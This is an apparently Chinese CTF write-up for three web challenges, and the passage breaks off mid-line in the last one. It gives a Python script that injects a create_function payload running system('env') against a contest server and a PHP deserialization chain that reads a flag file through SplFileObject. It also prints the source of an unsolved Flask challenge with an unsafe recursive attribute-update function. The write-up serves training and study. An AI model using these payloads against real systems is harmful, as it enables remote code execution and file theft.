<p>考的是匿名函数和create_func rce，算个签到题，这一题的话第一点就是绕过匿名函数和strlen的比较<br>首先介绍一下匿名函数，匿名函数其实是有名字的，为<code>\x00lambda_%d</code>，这个<code>%d</code>代指的是当前第几个匿名函数，所以我们需要不断发包，把匿名函数的尾缀和我们的strlen相同，exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">url=<span class="string">&quot;http://47.108.206.43:30243/&quot;</span></span><br><span class="line">d0g3=<span class="string">&#x27;11111&quot;], $b[&quot;a&quot;]);&#125;system(&quot;env&quot;);//include&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(d0g3))</span><br><span class="line">name=<span class="string">&quot;\x00lambda_42&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;d0g3&quot;</span>:d0g3,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r=requests.get(url,params=data)</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Is That My Name?&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>flag在环境变量里。</p>
<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>简单的反序列化。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Good</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$g1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$gg2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ggg3</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gg2 = <span class="variable">$ggg3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/a-zA-Z0-9~-=!\^\+\(\)/&quot;</span>,<span class="variable">$this</span>-&gt;gg2))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;gg2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;g1-&gt;g1=<span class="number">666</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Luck</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ll2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$md5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lll3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;md5 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;l1;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ll2-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md5)) == <span class="number">666</span>)</span><br><span class="line"><span class="comment">//        if(666 == 666)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;lll3-&gt;lll3))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;There is noting&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">To</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tt2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$this</span>-&gt;arg1)===<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;arg1))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;tt2-&gt;tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;what are you doing?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">You</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;y1-&gt;y1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;May be you can get what you want here&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$one</span>, <span class="variable">$two</span>) &#123;</span><br><span class="line">            <span class="variable">$three</span> = <span class="keyword">new</span> <span class="variable">$two</span>(<span class="variable">$one</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$three</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$tmp</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">You</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Luck</span>(<span class="string">&quot;213&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Luck</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Good</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="built_in">SplFileObject</span>=<span class="string">&quot;/FfffLlllLaAaaggGgGg&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;l1=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;l1=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;lll3=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;y1=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没啥难度。用原生类去读目录和文件。</p>
<h2 id="swagger-doc（未解出）"><a href="#swagger-doc（未解出）" class="headerlink" title="swagger_doc（未解出）"></a>swagger_doc（未解出）</h2><p>前言：<strong>这题未解出，只是放这记录下</strong><br>好歹是看了一小时的题，源码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,  jsonify,send_file,render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>]=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;fake_flag&#x27;</span></span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">response0 = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span></span><br><span class="line">&#125;</span><br><span class="line">response1=&#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: current_time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response2 = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">User = MemUser()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username,password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2),<span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_password</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                new_password = request.get_json()</span><br><span class="line">                <span class="keyword">if</span> new_password:</span><br><span class="line"></span><br><span class="line">                    update(new_password, User)</span><br><span class="line"></span><br><span class="line">                    updated_token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: User.username, <span class="string">&#x27;password&#x27;</span>: User.password&#125;,</span><br><span class="line">                                               app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                    User.token = updated_token</span><br><span class="line">                    response = jsonify(response1)</span><br><span class="line">                    response.set_cookie(<span class="string">&#x27;token&#x27;</span>,updated_token)</span><br><span class="line">                    <span class="keyword">return</span> response</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Something error?&quot;</span>,<span class="number">505</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> request.args.get(<span class="string">&#x27;id&#x27;</span>):</span><br><span class="line">                <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            data = requests.get(<span class="string">&quot;http://127.0.0.1:8899/v2/users?file=&quot;</span> + 